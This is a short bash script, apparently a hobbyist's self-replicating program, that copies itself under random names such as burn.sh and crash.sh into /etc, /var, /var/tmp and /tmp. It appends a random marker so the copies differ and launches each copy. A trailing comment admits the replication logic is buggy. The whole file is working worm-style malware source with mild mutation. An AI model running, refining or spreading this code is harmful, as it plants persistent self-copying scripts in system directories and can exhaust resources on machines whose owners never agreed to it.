#!/bin/bash

dirs=("/etc" "/var" "/var/tmp" "/tmp")
names=("float.sh" "sink.sh" "burn.sh" "crash.sh")
append=("#AAAA" "#BBBB" "#CCCC" "#DDDD" "#EEEE" "#FFFF" "#aaaa" "#bbbb" "#cccc" "#dddd" "#eeee" "#ffff")
rappend=${append[RANDOM%12]}
counter=0

replicate() {
	rdir=${dirs[RANDOM%4]}
	rando=${names[RANDOM%4]}
	cp ${0} "$rdir/$rando" 2>/dev/null
	echo "$rappend" >> "$rdir/$rando"
	bash "$rdir/$rando"
	return
}

checker(){
	for dir in ${dirs[@]}; do # iterates through directory list
		for name in ${names[@]}; do # iterates through names array in each directory
			findo=$(find "$dir/" -iname "$name" 2>/dev/null) # looks for an existing replicant
			if [ ! -z "$findo" ]; then # if the name is there add 1 to counter
				let counter++
			fi
		done
	done
}

while [ $counter -lt 2 ]; do
	checker
	replicate
done

# 3 problems: Spawned replicant is not running, Replication is happening twice
